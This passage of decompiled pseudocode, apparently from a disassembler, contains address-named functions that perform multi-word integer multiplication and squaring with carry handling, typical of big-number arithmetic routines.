  v44 = HIDWORD(v39) + v42 + (((unsigned int)v43 + a3[4] * (unsigned __int64)a2[7]) >> 32);
  a1[11] = v43 + a3[4] * a2[7];
  v45 = (((unsigned int)v44 + a3[7] * a2[5] + a3[6] * (unsigned __int64)a2[6]) >> 32)
      + (((unsigned int)v44 + a3[7] * (unsigned __int64)a2[5]) >> 32)
      + HIDWORD(v44);
  v46 = a3[5] * (unsigned __int64)a2[7] + (_DWORD)v44 + a3[7] * a2[5] + a3[6] * a2[6];
  a1[12] = v46;
  v47 = HIDWORD(v46) + v45;
  v49 = ((((unsigned int)v47 + a3[7] * (unsigned __int64)a2[6]) >> 32) + HIDWORD(v47)) >> 32;
  v48 = (((unsigned int)v47 + a3[7] * (unsigned __int64)a2[6]) >> 32) + HIDWORD(v47);
  v50 = a3[6] * (unsigned __int64)a2[7] + (unsigned int)v47 + a3[7] * a2[6];
  a1[13] = v50;
  v51 = HIDWORD(v50) + a3[7] * (unsigned __int64)a2[7];
  v52 = HIDWORD(v50) + a3[7] * a2[7];
  a1[14] = v48 + v52;
  result = __PAIR64__(HIDWORD(v51), v48) + __PAIR64__(v49, v52);
  a1[15] = HIDWORD(result);
  return result;
}

//----- (0043FAC0) --------------------------------------------------------
int __cdecl sub_43FAC0(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  unsigned __int64 v3; // rax
  int result; // eax

  v3 = *a3 * (unsigned __int64)*a2;
  *a1 = v3;
  result = *a3 * a2[1];
  a1[1] = HIDWORD(v3) + result + *a2 * a3[1];
  return result;
}

//----- (0043FAF0) --------------------------------------------------------
int __cdecl sub_43FAF0(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  __int64 v3; // rcx
  __int64 v4; // kr10_8
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // kr18_8
  unsigned __int64 v7; // kr20_8
  int v8; // ebp
  unsigned __int64 v9; // rax
  int result; // eax

  LODWORD(v3) = (*a3 * (unsigned __int64)*a2) >> 32;
  *a1 = *a3 * *a2;
  HIDWORD(v3) = (a3[1] * (unsigned __int64)*a2) >> 32;
  v4 = v3 + a3[1] * *a2;
  v5 = *a3 * (unsigned __int64)a2[1];
  a1[1] = v4 + v5;
  v6 = (unsigned int)__CFADD__((_DWORD)v4, (_DWORD)v5) + HIDWORD(v5) + (unsigned __int64)HIDWORD(v4);
  v7 = (unsigned int)(*a3 * a2[2] + ((v4 + v5) >> 32)) + a3[1] * (unsigned __int64)a2[1];
  v8 = HIDWORD(v7) + ((*a3 * (unsigned __int64)a2[2] + (unsigned int)v6) >> 32) + HIDWORD(v6);
  v9 = (unsigned int)v7 + a3[2] * (unsigned __int64)*a2;
  a1[2] = v9;
  result = a2[1] * a3[2] + *a3 * a2[3] + *a2 * a3[3] + v8 + a2[2] * a3[1];
  a1[3] = result + HIDWORD(v9);
  return result;
}

//----- (0043FBA0) --------------------------------------------------------
int __cdecl sub_43FBA0(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  int v4; // ecx
  unsigned int v5; // kr00_4
  __int64 v6; // kr08_8
  int v7; // esi
  unsigned int v8; // edi
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // kr20_8
  unsigned __int64 v11; // kr28_8
  unsigned int v12; // kr10_4
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // kr38_8
  unsigned __int64 v15; // kr40_8
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // kr60_8
  unsigned __int64 v18; // kr68_8
  unsigned __int64 v19; // kr78_8
  unsigned __int64 v20; // kr88_8
  unsigned __int64 v21; // kr90_8
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // kr98_8
  unsigned __int64 v24; // krA0_8
  unsigned __int64 v25; // krB0_8
  unsigned __int64 v26; // krC0_8
  int v27; // esi
  unsigned __int64 v28; // krD8_8
  unsigned __int64 v29; // rax
  unsigned __int64 v30; // krE0_8
  unsigned __int64 v31; // krE8_8
  unsigned __int64 v32; // krF0_8
  unsigned __int64 v33; // krF8_8
  unsigned __int64 v34; // kr100_8
  unsigned __int64 v35; // kr108_8
  int v36; // ebx
  unsigned __int64 v37; // rax
  int result; // eax

  v5 = *a3;
  v6 = *a2;
  v4 = ((unsigned __int64)*a3 * v6) >> 32;
  *a1 = *a3 * *a2;
  v7 = (__PAIR64__(a3[1], v5) * v6) >> 32;
  v8 = __CFADD__(v4, a3[1] * *a2) + ((a3[1] * (unsigned __int64)*a2) >> 32);
  v9 = *a3 * (unsigned __int64)a2[1];
  a1[1] = v7 + v9;
  v10 = (unsigned int)__CFADD__(v7, (_DWORD)v9) + HIDWORD(v9) + (unsigned __int64)v8;
  v11 = (unsigned int)v10 + a3[2] * (unsigned __int64)*a2;
  v12 = ((unsigned int)v11 + a3[1] * (unsigned __int64)a2[1]) >> 32;
  v13 = *a3 * (unsigned __int64)a2[2] + (unsigned int)v11 + a3[1] * a2[1];
  a1[2] = v13;
  v14 = HIDWORD(v11) + (unsigned __int64)HIDWORD(v10) + v12 + HIDWORD(v13);
  v15 = (unsigned int)v14 + a3[3] * (unsigned __int64)*a2;
  v16 = (_DWORD)v15 + a3[2] * a2[1] + a3[1] * a2[2] + *a3 * (unsigned __int64)a2[3];
  v17 = HIDWORD(v16)
      + (((unsigned int)v15 + a3[2] * a2[1] + a3[1] * (unsigned __int64)a2[2]) >> 32)
      + HIDWORD(v15)
      + (unsigned __int64)HIDWORD(v14)
      + (((unsigned int)v15 + a3[2] * (unsigned __int64)a2[1]) >> 32);
  a1[3] = v16;
  v18 = (unsigned int)v17 + a3[4] * (unsigned __int64)*a2;
  v19 = (unsigned int)v18 + a3[3] * (unsigned __int64)a2[1];
  v20 = (unsigned int)v19 + a3[2] * (unsigned __int64)a2[2];
  v21 = (((unsigned int)v20 + a3[1] * (unsigned __int64)a2[3]) >> 32)
      + HIDWORD(v20)
      + HIDWORD(v19)
      + HIDWORD(v18)
      + (unsigned __int64)HIDWORD(v17);
  v22 = *a3 * (unsigned __int64)a2[4] + (unsigned int)v20 + a3[1] * a2[3];
  a1[4] = v22;
  v23 = HIDWORD(v22) + v21;
  v24 = (unsigned int)v23 + a3[5] * (unsigned __int64)*a2;
  v25 = (unsigned int)v24 + a3[4] * (unsigned __int64)a2[1];
  v26 = (unsigned int)v25 + a3[3] * (unsigned __int64)a2[2];
  v27 = a3[1] * a2[4] + v26 + a3[2] * a2[3];
  v28 = ((a3[1] * (unsigned __int64)a2[4] + (unsigned int)v26 + a3[2] * a2[3]) >> 32)
      + (((unsigned int)v26 + a3[2] * (unsigned __int64)a2[3]) >> 32)
      + HIDWORD(v26)
      + HIDWORD(v25)
      + HIDWORD(v24)
      + (unsigned __int64)HIDWORD(v23);
  v29 = *a3 * (unsigned __int64)a2[5];
  a1[5] = v27 + v29;
  v30 = (unsigned int)__CFADD__(v27, (_DWORD)v29) + HIDWORD(v29) + v28;
  v31 = (unsigned int)v30 + a3[6] * (unsigned __int64)*a2;
  v32 = (unsigned int)v31 + a3[5] * (unsigned __int64)a2[1];
  v33 = (unsigned int)v32 + a3[4] * (unsigned __int64)a2[2];
  v34 = (unsigned int)v33 + a3[3] * (unsigned __int64)a2[3];
  v35 = (unsigned int)v34 + a3[2] * (unsigned __int64)a2[4];
  v36 = (((unsigned int)v35 + a3[1] * (unsigned __int64)a2[5]) >> 32)
      + HIDWORD(v35)
      + HIDWORD(v34)
      + HIDWORD(v33)
      + HIDWORD(v32)
      + HIDWORD(v31)
      + HIDWORD(v30);
  v37 = (unsigned int)v35 + a3[1] * a2[5] + *a3 * (unsigned __int64)a2[6];
  a1[6] = v37;
  result = HIDWORD(v37)
         + a3[1] * a2[6]
         + a3[5] * a2[2]
         + a3[4] * a2[3]
         + a2[4] * a3[3]
         + *a3 * a2[7]
         + *a2 * a3[7]
         + v36
         + a3[2] * a2[5]
         + a2[1] * a3[6];
  a1[7] = result;
  return result;
}

//----- (0043FE50) --------------------------------------------------------
_QWORD *__cdecl sub_43FE50(_QWORD *a1, unsigned int *a2, unsigned int *a3)
{
  unsigned int v3; // ebp
  _QWORD *result; // eax
  unsigned int v5; // [esp+1Ch] [ebp+Ch]

  v3 = *a3;
  v5 = a3[1];
  result = a1;
  *a1 = ((v5 * (unsigned __int64)*a2 + ((v3 * (unsigned __int64)*a2) >> 32)) >> 32)
      + v5 * (unsigned __int64)a2[1]
      + (unsigned int)(__CFADD__((__PAIR64__(v5, v3) * *a2) >> 32, v3 * a2[1]) + ((v3 * (unsigned __int64)a2[1]) >> 32));
  return result;
}

//----- (0043FEB0) --------------------------------------------------------
unsigned __int64 __cdecl sub_43FEB0(_DWORD *a1, unsigned int *a2, unsigned int *a3, unsigned int a4)
{
  unsigned int v4; // ebx
  unsigned __int64 v5; // kr18_8
  unsigned int v6; // esi
  unsigned __int64 v7; // kr28_8
  unsigned int v8; // edx
  int v9; // esi
  unsigned __int64 v10; // kr38_8
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // kr40_8
  unsigned int v13; // kr08_4
  unsigned __int64 v14; // kr48_8
  unsigned __int64 v15; // rax
  int v16; // kr50_4
  unsigned __int64 v17; // kr58_8
  int v18; // ecx
  unsigned __int64 v19; // rax
  unsigned __int64 result; // rax

  v4 = a3[3];
  v5 = ((a3[1] * (unsigned __int64)a2[1]) >> 32)
     + ((a3[2] * (unsigned __int64)*a2) >> 32)
     + ((*a3 * (unsigned __int64)a2[2]) >> 32);
  v6 = v4 * *a2 + v5;
  v7 = ((v4 * (unsigned __int64)*a2 + (unsigned int)v5) >> 32)
     + HIDWORD(v5)
     + ((v6 + a3[2] * (unsigned __int64)a2[1]) >> 32);
  v8 = (v6 + a3[2] * a2[1] + a3[1] * (unsigned __int64)a2[2]) >> 32;
  v9 = v6 + a3[2] * a2[1] + a3[1] * a2[2];
  v10 = v8 + v7;
  v11 = *a3 * (unsigned __int64)a2[3];
  v12 = (((unsigned int)v9 + v11) >> 32) + (a4 < v9 + (int)v11);
  v13 = v12 + v10 + v4 * a2[1];
  v14 = ((a3[2] * (unsigned __int64)a2[2] + v13) >> 32)
      + (((unsigned int)(v12 + v10) + v4 * (unsigned __int64)a2[1]) >> 32)
      + ((v12 + v10) >> 32);
  v15 = a3[1] * (unsigned __int64)a2[3] + a3[2] * a2[2] + v13;
  *a1 = v15;
  v16 = HIDWORD(v15) + v14 + a3[3] * a2[2];
  v17 = (((unsigned int)(HIDWORD(v15) + v14) + a3[3] * (unsigned __int64)a2[2]) >> 32)
      + (unsigned int)__CFADD__(HIDWORD(v15), (_DWORD)v14)
      + HIDWORD(v14);
  LODWORD(v15) = a3[2] * a2[3];
  v18 = (a3[2] * (unsigned __int64)a2[3]) >> 32;
  a1[1] = v16 + v15;
  v19 = (unsigned int)__CFADD__(v16, (_DWORD)v15) + v18 + a3[3] * (unsigned __int64)a2[3];
  a1[2] = v17 + v19;
  result = v17 + v19;
  a1[3] = HIDWORD(result);
  return result;
}

//----- (00440010) --------------------------------------------------------
unsigned __int64 __cdecl sub_440010(_DWORD *a1, unsigned int *a2, unsigned int *a3, unsigned int a4)
{
  unsigned int v4; // ebx
  unsigned __int64 v5; // kr50_8
  unsigned int v6; // esi
  unsigned __int64 v7; // krA8_8
  unsigned __int64 v8; // krC8_8
  unsigned int v9; // edx
  int v10; // esi
  unsigned __int64 v11; // krD8_8
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // krE0_8
  unsigned int v14; // esi
  unsigned int v15; // kr28_4
  int v16; // esi
  unsigned int v17; // ebx
  unsigned int v18; // kr100_4
  unsigned int v19; // kr30_4
  int v20; // esi
  unsigned int v21; // ebx
  int v22; // kr110_4
  unsigned int v23; // kr38_4
  unsigned __int64 v24; // rax
  unsigned __int64 v25; // kr118_8
  unsigned int v26; // esi
  unsigned int v27; // kr44_4
  int v28; // esi
  unsigned int v29; // ebx
  unsigned int v30; // edi
  unsigned int v31; // kr4C_4
  int v32; // esi
  unsigned int v33; // edi
  int v34; // kr148_4
  unsigned __int64 v35; // rax
  unsigned __int64 v36; // kr150_8
  unsigned int v37; // kr60_4
  unsigned __int64 v38; // kr178_8
  unsigned __int64 v39; // rax
  int v40; // kr64_4
  unsigned int v41; // kr68_4
  unsigned __int64 v42; // kr180_8
  unsigned int v43; // esi
  unsigned int v44; // ebx
  unsigned int v45; // edi
  int v46; // esi
  unsigned int v47; // kr74_4
  unsigned __int64 v48; // rax
  unsigned __int64 v49; // kr1A0_8
  unsigned int v50; // esi
  unsigned __int64 v51; // kr1C0_8
  unsigned __int64 v52; // rax
  int v53; // kr80_4
  unsigned int v54; // kr84_4
  unsigned __int64 v55; // kr1C8_8
  int v56; // esi
  unsigned __int64 v57; // kr1D8_8
  int v58; // ecx
  unsigned __int64 v59; // rax
  unsigned __int64 result; // rax

  v4 = a3[7];
  v5 = ((a3[3] * (unsigned __int64)a2[3]) >> 32)
     + ((a3[2] * (unsigned __int64)a2[4]) >> 32)
     + ((a3[5] * (unsigned __int64)a2[1]) >> 32)
     + ((a3[4] * (unsigned __int64)a2[2]) >> 32)
     + ((*a3 * (unsigned __int64)a2[6]) >> 32)
     + ((a3[6] * (unsigned __int64)*a2) >> 32)
     + ((a3[1] * (unsigned __int64)a2[5]) >> 32);
  v6 = v4 * *a2 + v5;
  v7 = ((a3[5] * (unsigned __int64)a2[2] + v6 + a3[6] * a2[1]) >> 32)
     + ((v4 * (unsigned __int64)*a2 + (unsigned int)v5) >> 32)
     + HIDWORD(v5)
     + ((v6 + a3[6] * (unsigned __int64)a2[1]) >> 32)
     + ((a3[5] * a2[2] + v6 + a3[6] * a2[1] + a3[4] * (unsigned __int64)a2[3]) >> 32);
  v8 = ((a3[3] * (unsigned __int64)a2[4] + a3[5] * a2[2] + v6 + a3[6] * a2[1] + a3[4] * a2[3]) >> 32)
     + v7
     + ((a3[3] * a2[4] + a3[5] * a2[2] + v6 + a3[6] * a2[1] + a3[4] * a2[3] + a3[2] * (unsigned __int64)a2[5]) >> 32);
  v9 = (a3[3] * a2[4]
      + a3[5] * a2[2]
      + v6
      + a3[6] * a2[1]
      + a3[4] * a2[3]
      + a3[2] * a2[5]
      + a3[1] * (unsigned __int64)a2[6]) >> 32;
  v10 = a3[3] * a2[4] + a3[5] * a2[2] + v6 + a3[6] * a2[1] + a3[4] * a2[3] + a3[2] * a2[5] + a3[1] * a2[6];
  v11 = v9 + v8;
  v12 = *a3 * (unsigned __int64)a2[7];
  v13 = (((unsigned int)v10 + v12) >> 32) + (a4 < v10 + (int)v12);
  v14 = v4 * a2[1] + v13 + v11;
  v15 = (v14 + a3[6] * (unsigned __int64)a2[2]) >> 32;
  HIDWORD(v12) = (a3[5] * (unsigned __int64)a2[3] + v14 + a3[6] * a2[2]) >> 32;
  v16 = a3[5] * a2[3] + v14 + a3[6] * a2[2];
  v18 = HIDWORD(v12) + ((v4 * (unsigned __int64)a2[1] + (unsigned int)(v13 + v11)) >> 32) + ((v13 + v11) >> 32) + v15;
  v17 = (HIDWORD(v12) + ((v4 * (unsigned __int64)a2[1] + (unsigned int)(v13 + v11)) >> 32) + ((v13 + v11) >> 32) + v15) >> 32;
  v19 = ((unsigned int)v16 + a3[4] * (unsigned __int64)a2[4]) >> 32;
  HIDWORD(v12) = (a3[3] * (unsigned __int64)a2[5] + v16 + a3[4] * a2[4]) >> 32;
  v20 = a3[3] * a2[5] + v16 + a3[4] * a2[4];
  v22 = v19 + v18 + HIDWORD(v12);
  v21 = (__PAIR64__(v17, v19) + v18 + HIDWORD(v12)) >> 32;
  v23 = ((unsigned int)v20 + a3[2] * (unsigned __int64)a2[6]) >> 32;
  v24 = a3[1] * (unsigned __int64)a2[7] + v20 + a3[2] * a2[6];
  *a1 = v24;
  v25 = __PAIR64__(v21, v23) + (unsigned int)v22 + HIDWORD(v24);
  v26 = a3[7] * a2[2] + v25;
  v27 = (v26 + a3[6] * (unsigned __int64)a2[3]) >> 32;
  HIDWORD(v24) = (a3[5] * (unsigned __int64)a2[4] + v26 + a3[6] * a2[3]) >> 32;
  v28 = a3[5] * a2[4] + v26 + a3[6] * a2[3];
  v30 = (HIDWORD(v24) + ((a3[7] * (unsigned __int64)a2[2] + (unsigned int)v25) >> 32) + HIDWORD(v25) + v27) >> 32;
  v29 = HIDWORD(v24) + ((a3[7] * (unsigned __int64)a2[2] + (unsigned int)v25) >> 32) + HIDWORD(v25) + v27;
  v31 = ((unsigned int)v28 + a3[4] * (unsigned __int64)a2[5]) >> 32;
  HIDWORD(v24) = (a3[3] * (unsigned __int64)a2[6] + v28 + a3[4] * a2[5]) >> 32;
  v32 = a3[3] * a2[6] + v28 + a3[4] * a2[5];
  v34 = HIDWORD(v24) + v31 + v29;
  v33 = (HIDWORD(v24) + __PAIR64__(v30, v31) + v29) >> 32;
  v35 = a3[2] * (unsigned __int64)a2[7];
  a1[1] = v32 + v35;
  v36 = __PAIR64__(v33, (unsigned int)__CFADD__(v32, (_DWORD)v35) + HIDWORD(v35)) + (unsigned int)v34;
  v37 = a3[5] * a2[5] + v36 + a3[7] * a2[3] + a3[6] * a2[4];
  v38 = ((a3[4] * (unsigned __int64)a2[6] + v37) >> 32)
      + ((a3[5] * (unsigned __int64)a2[5] + (_DWORD)v36 + a3[7] * a2[3] + a3[6] * a2[4]) >> 32)
      + (((unsigned int)v36 + a3[7] * (unsigned __int64)a2[3]) >> 32)
      + HIDWORD(v36)
      + (((unsigned int)v36 + a3[7] * a2[3] + a3[6] * (unsigned __int64)a2[4]) >> 32);
  v39 = a3[3] * (unsigned __int64)a2[7];
  v40 = a3[3] * a2[7];
  v41 = a3[4] * a2[6] + v37;
  a1[2] = v41 + v40;
  v42 = ((__PAIR64__(HIDWORD(v39), v41) + (unsigned int)v40) >> 32) + v38;
  v43 = v42 + a3[7] * a2[4];
  v45 = ((((unsigned int)v42 + a3[7] * (unsigned __int64)a2[4]) >> 32)
       + HIDWORD(v42)
       + ((v43 + a3[6] * (unsigned __int64)a2[5]) >> 32)) >> 32;
  v44 = (((unsigned int)v42 + a3[7] * (unsigned __int64)a2[4]) >> 32)
      + HIDWORD(v42)
      + ((v43 + a3[6] * (unsigned __int64)a2[5]) >> 32);
  HIDWORD(v39) = (a3[5] * (unsigned __int64)a2[6] + v43 + a3[6] * a2[5]) >> 32;
  v46 = a3[5] * a2[6] + v43 + a3[6] * a2[5];
  v47 = HIDWORD(v39);
  v48 = a3[4] * (unsigned __int64)a2[7];
  a1[3] = v46 + v48;
  v49 = __PAIR64__(v45, v47) + v44 + (unsigned int)__CFADD__(v46, (_DWORD)v48) + HIDWORD(v48);
  v50 = v49 + a3[7] * a2[5];
  v51 = ((a3[6] * (unsigned __int64)a2[6] + v50) >> 32)
      + (((unsigned int)v49 + a3[7] * (unsigned __int64)a2[5]) >> 32)
      + HIDWORD(v49);
  v52 = a3[5] * (unsigned __int64)a2[7];
  v53 = a3[5] * a2[7];
  v54 = a3[6] * a2[6] + v50;
  a1[4] = v54 + v53;
  v55 = ((__PAIR64__(HIDWORD(v52), v54) + (unsigned int)v53) >> 32) + v51;
  v56 = v55 + a3[7] * a2[6];
  v57 = (((unsigned int)v55 + a3[7] * (unsigned __int64)a2[6]) >> 32) + HIDWORD(v55);
  LODWORD(v52) = a3[6] * a2[7];
  v58 = (a3[6] * (unsigned __int64)a2[7]) >> 32;
  a1[5] = v56 + v52;
  v59 = (unsigned int)__CFADD__(v56, (_DWORD)v52) + v58 + a3[7] * (unsigned __int64)a2[7];
  a1[6] = v57 + v59;
  result = v57 + v59;
  a1[7] = HIDWORD(result);
  return result;
}

//----- (00440430) --------------------------------------------------------
_DWORD *__cdecl sub_440430(_DWORD *a1, unsigned int *a2)
{
  unsigned __int64 v3; // rax
  unsigned __int64 v4; // kr08_8
  _DWORD *result; // eax
  unsigned __int64 v6; // kr18_8
  int v7; // [esp+18h] [ebp+8h]

  v3 = *a2 * (unsigned __int64)*a2;
  *a1 = v3;
  v4 = a2[1] * (unsigned __int64)*a2;
  v7 = ((unsigned int)(2 * v4) + (unsigned __int64)HIDWORD(v3)) >> 32;
  a1[1] = 2 * v4 + HIDWORD(v3);
  result = a1;
  v6 = ((unsigned int)v4 >> 31) + 2i64 * HIDWORD(v4) + a2[1] * (unsigned __int64)a2[1];
  a1[2] = v7 + v6;
  a1[3] = __CFADD__(v7, (_DWORD)v6) + HIDWORD(v6);
  return result;
}

//----- (004404A0) --------------------------------------------------------
_DWORD *__cdecl sub_4404A0(_DWORD *a1, unsigned int *a2)
{
  unsigned __int64 v3; // rax
  unsigned int v4; // edi
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // kr28_8
  unsigned int v7; // esi
  __int64 v8; // rcx
  unsigned int v9; // kr30_4
  __int64 v10; // kr38_8
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // kr40_8
  unsigned __int64 v13; // kr48_8
  unsigned __int64 v14; // kr50_8
  unsigned __int64 v15; // kr58_8
  unsigned __int64 v16; // rax
  unsigned __int64 v18; // kr80_8
  unsigned __int64 v19; // kr88_8
  int v20; // ebp
  _DWORD *result; // eax
  unsigned __int64 v22; // kr98_8
  int v23; // [esp+10h] [ebp-8h]

  v3 = *a2 * (unsigned __int64)*a2;
  *a1 = v3;
  v4 = HIDWORD(v3);
  v5 = ((a2[1] * *a2) >> 31) + 2 * ((a2[1] * (unsigned __int64)*a2) >> 32);
  v6 = __PAIR64__(v5, 2 * a2[1] * *a2) + v4;
  v23 = HIDWORD(v5) + __CFADD__((_DWORD)v5, HIDWORD(v6));
  a1[1] = v6;
  v7 = a2[2] * *a2;
  LODWORD(v8) = v7 >> 31;
  v9 = 2 * ((a2[2] * (unsigned __int64)*a2) >> 32);
  HIDWORD(v8) = (a2[2] * (unsigned __int64)*a2) >> 32 >> 31;
  v10 = v8 + v9;
  v11 = 2 * v7 + a2[1] * (unsigned __int64)a2[1];
  v12 = __PAIR64__(v23, v11) + HIDWORD(v6);
  v13 = HIDWORD(v11) + (unsigned __int64)HIDWORD(v12);
  HIDWORD(v8) = a2;
  a1[2] = v12;
  v14 = *(unsigned int *)(HIDWORD(v8) + 12) * (unsigned __int64)(unsigned int)*(_DWORD *)HIDWORD(v8);
  v15 = *(unsigned int *)(HIDWORD(v8) + 8) * (unsigned __int64)*(unsigned int *)(HIDWORD(v8) + 4) + (unsigned int)v14;
  a1[3] = 2 * v15 + v10 + v13;
  v16 = a2[2] * (unsigned __int64)a2[2] + 2 * a2[3] * a2[1];
  v18 = 2 * ((a2[3] * (unsigned __int64)a2[1]) >> 32)
      + ((a2[3] * a2[1]) >> 31)
      + HIDWORD(v16)
      + ((2i64 * HIDWORD(v14)
        + ((unsigned int)v15 >> 31)
        + 2i64 * HIDWORD(v15)
        + (((unsigned int)(2 * v15) + v10 + v13) >> 32)
        + (unsigned int)v16) >> 32);
  a1[4] = 2 * HIDWORD(v14)
        + ((unsigned int)v15 >> 31)
        + 2 * HIDWORD(v15)
        + (((unsigned int)(2 * v15) + v10 + v13) >> 32)
        + v16;
  v19 = a2[3] * (unsigned __int64)a2[2];
  v20 = __CFADD__(2 * v19, (_DWORD)v18) + HIDWORD(v18);
  a1[5] = 2 * v19 + v18;
  result = a1;
  v22 = ((unsigned int)v19 >> 31) + 2i64 * HIDWORD(v19) + a2[3] * (unsigned __int64)a2[3];
  a1[6] = v20 + v22;
  a1[7] = __CFADD__(v20, (_DWORD)v22) + HIDWORD(v22);
  return result;
}

//----- (00440650) --------------------------------------------------------
_DWORD *__cdecl sub_440650(_DWORD *a1, unsigned int *a2)
{
  unsigned __int64 v3; // rax
  unsigned int v4; // edi
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // kr68_8
  unsigned int v7; // esi
  __int64 v8; // rcx
  unsigned int v9; // kr70_4
  __int64 v10; // kr78_8
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // kr80_8
  unsigned __int64 v13; // kr90_8
  unsigned __int64 v14; // kr98_8
  unsigned int v15; // esi
  unsigned __int64 v16; // krB0_8
  unsigned __int64 v17; // krB8_8
  unsigned __int64 v18; // krC0_8
  unsigned __int64 v20; // rax
  unsigned __int64 v21; // krC8_8
  unsigned __int64 v22; // krD0_8
  unsigned __int64 v23; // krE0_8
  unsigned int v24; // esi
  unsigned __int64 v25; // krF0_8
  unsigned __int64 v26; // krF8_8
  unsigned __int64 v27; // kr108_8
  unsigned __int64 v29; // rax
  unsigned __int64 v30; // kr118_8
  __int64 v31; // rcx
  unsigned __int64 v32; // kr130_8
  unsigned __int64 v33; // kr140_8
  unsigned int v34; // esi
  bool v35; // cf
  unsigned __int64 v36; // kr150_8
  unsigned __int64 v37; // kr160_8
  unsigned __int64 v38; // kr170_8
  unsigned __int64 v39; // rax
  int v40; // edi
  unsigned __int64 v41; // kr88_8
  unsigned int v42; // kr180_4
  unsigned __int64 v43; // kr188_8
  unsigned int v44; // edi
  unsigned int v45; // esi
  unsigned __int64 v46; // kr1A8_8
  unsigned __int64 v47; // kr1B0_8
  unsigned __int64 v48; // kr1B8_8
  unsigned __int64 v49; // rax
  unsigned __int64 v50; // kr1C0_8
  unsigned __int64 v51; // kr1C8_8
  unsigned __int64 v52; // kr1D0_8
  unsigned __int64 v53; // kr1D8_8
  unsigned __int64 v54; // kr1E8_8
  unsigned __int64 v55; // rax
  unsigned __int64 v56; // kr1F8_8
  unsigned __int64 v58; // kr200_8
  int v59; // ebp
  _DWORD *result; // eax
  unsigned __int64 v61; // kr210_8
  int v62; // [esp+10h] [ebp-Ch]
  unsigned int v63; // [esp+10h] [ebp-Ch]
  unsigned __int64 v64; // [esp+10h] [ebp-Ch]

  v3 = *a2 * (unsigned __int64)*a2;
  *a1 = v3;
  v4 = HIDWORD(v3);
  v5 = ((a2[1] * *a2) >> 31) + 2 * ((a2[1] * (unsigned __int64)*a2) >> 32);
  v6 = __PAIR64__(v5, 2 * a2[1] * *a2) + v4;
  v62 = HIDWORD(v5) + __CFADD__((_DWORD)v5, HIDWORD(v6));
  a1[1] = v6;
  v7 = a2[2] * *a2;
  LODWORD(v8) = v7 >> 31;
  v9 = 2 * ((a2[2] * (unsigned __int64)*a2) >> 32);
  HIDWORD(v8) = (a2[2] * (unsigned __int64)*a2) >> 32 >> 31;
  v10 = v8 + v9;
  v11 = 2 * v7 + a2[1] * (unsigned __int64)a2[1];
  v12 = __PAIR64__(v62, v11) + HIDWORD(v6);
  HIDWORD(v8) = a2;
  a1[2] = v12;
  v13 = *(unsigned int *)(HIDWORD(v8) + 12) * (unsigned __int64)(unsigned int)*(_DWORD *)HIDWORD(v8);
  v14 = *(unsigned int *)(HIDWORD(v8) + 8) * (unsigned __int64)*(unsigned int *)(HIDWORD(v8) + 4) + (unsigned int)v13;
  HIDWORD(v8) = a2;
  v15 = 2 * HIDWORD(v13) + ((unsigned int)v14 >> 31) + 2 * HIDWORD(v14);
  v16 = __PAIR64__(v15, 2 * (int)v14) + v10 + HIDWORD(v11) + (unsigned __int64)HIDWORD(v12);
  a1[3] = v16;
  v17 = *(unsigned int *)(HIDWORD(v8) + 16) * (unsigned __int64)(unsigned int)*(_DWORD *)HIDWORD(v8);
  v18 = *(unsigned int *)(HIDWORD(v8) + 12) * (unsigned __int64)*(unsigned int *)(HIDWORD(v8) + 4) + (unsigned int)v17;
  v20 = a2[2] * (unsigned __int64)a2[2] + (unsigned int)(2 * v18);
  v21 = __PAIR64__(
          ((2i64 * HIDWORD(v13) + ((unsigned int)v14 >> 31) + 2 * (unsigned __int64)HIDWORD(v14)) >> 32)
        + __CFADD__(v15, HIDWORD(v16)),
          v20)
      + HIDWORD(v16);
  a1[4] = v21;
  v22 = a2[5] * *a2 + a2[4] * (unsigned __int64)a2[1];
  v23 = (unsigned int)v22 + a2[3] * (unsigned __int64)a2[2];
  v24 = 2 * (HIDWORD(v22) + ((a2[5] * (unsigned __int64)*a2) >> 32)) + ((unsigned int)v23 >> 31) + 2 * HIDWORD(v23);
  v25 = __PAIR64__(v24, 2 * (int)v23)
      + 2i64 * HIDWORD(v17)
      + ((unsigned int)v18 >> 31)
      + 2i64 * HIDWORD(v18)
      + HIDWORD(v20)
      + (unsigned __int64)HIDWORD(v21);
  HIDWORD(v8) = a2;
  v63 = ((2 * (HIDWORD(v22) + ((a2[5] * (unsigned __int64)*a2) >> 32)) + ((unsigned int)v23 >> 31) + 2i64 * HIDWORD(v23)) >> 32)
      + __CFADD__(v24, HIDWORD(v25));
  a1[5] = v25;
  v26 = (unsigned int)(*(_DWORD *)(HIDWORD(v8) + 24) * *(_DWORD *)HIDWORD(v8))
      + *(unsigned int *)(HIDWORD(v8) + 20) * (unsigned __int64)*(unsigned int *)(HIDWORD(v8) + 4);
  v27 = (unsigned int)v26 + a2[4] * (unsigned __int64)a2[2];
  v29 = a2[3] * (unsigned __int64)a2[3] + (unsigned int)(2 * v27);
  v30 = __PAIR64__(v63, v29) + HIDWORD(v25);
  v64 = 2
      * (HIDWORD(v26)
       + ((*(unsigned int *)(HIDWORD(v8) + 24) * (unsigned __int64)(unsigned int)*(_DWORD *)HIDWORD(v8)) >> 32))
      + 2i64 * HIDWORD(v27)
      + ((unsigned int)v27 >> 31)
      + HIDWORD(v29)
      + (unsigned __int64)HIDWORD(v30);
  a1[6] = v30;
  v31 = a2[7] * *a2;
  v32 = (unsigned int)v31 + a2[6] * a2[1] + a2[5] * (unsigned __int64)a2[2];
  v33 = a2[4] * (unsigned __int64)a2[3] + (unsigned int)v32;
  HIDWORD(v29) = (2
                * (HIDWORD(v32)
                 + __PAIR64__(HIDWORD(v31), (v31 + a2[6] * (unsigned __int64)a2[1]) >> 32)
                 + __PAIR64__(HIDWORD(v31), (a2[7] * (unsigned __int64)*a2) >> 32))
                + 2i64 * HIDWORD(v33)
                + ((unsigned int)v33 >> 31)) >> 32;
